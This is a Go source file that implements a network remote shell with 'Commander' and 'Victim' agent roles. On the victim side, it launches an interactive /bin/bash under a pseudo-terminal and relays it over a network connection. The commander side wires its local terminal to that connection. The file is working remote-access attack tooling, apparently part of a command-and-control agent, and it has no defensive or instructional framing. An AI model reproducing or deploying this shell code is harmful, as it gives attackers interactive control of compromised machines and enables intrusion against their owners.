package util

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"github.com/creack/pty"
	"errors"
)

const(
	CommanderAgentTypeEnum = "Commander"
	VictimAgentTypeEnum = "Victim"
)

func RemoteShell(conn net.Conn, agentType string, ctx context.Context) error{
	if agentType == CommanderAgentTypeEnum{
		return commanderRemoteShell(conn, ctx)
	} else if agentType == VictimAgentTypeEnum {
		return victimRemoteShell(conn, ctx)
	} else {
		return errors.New("Invalid agent type.")
	}
}

func commanderRemoteShell(conn net.Conn, ctx context.Context) error{
	if err := ctx.Err(); err != nil {
		return err 
	}
	doneCh :=  make(chan struct{})
	go func() {
		_, err := io.Copy(os.Stdout, conn)
		if err != nil{
			fmt.Println(err)
		}
		doneCh <- struct{}{}
	}()
	go func() {
		_, err := io.Copy(conn, os.Stdin)
		if err != nil{
			fmt.Println(err)
		}
		doneCh <- struct{}{}
	}()
	select {
	case <-ctx.Done():
	case <-doneCh:
	}
	return nil 
}

func victimRemoteShell(conn net.Conn, ctx context.Context) error{
	if err := ctx.Err(); err != nil {
		return err 
	}
	cmd := exec.Command("/bin/bash", []string{"-i",}...)
	ptyFile, err := pty.Start(cmd)
	if err != nil {
		return err  
	}
	defer ptyFile.Close()
	doneCh := make(chan struct{})
	go func() {
		if _, err := io.Copy(ptyFile, conn) ; err != nil{
			fmt.Println(err)
		}
		doneCh <- struct{}{}
	}()
	go func() {
		if _, err := io.Copy(conn, ptyFile); err != nil{
			fmt.Println(err)
		} 
		doneCh <- struct{}{}
	}()
	select {
	case <-ctx.Done():
	case <-doneCh:
	}
	// err = cmd.Process.Kill()
	return nil  
}


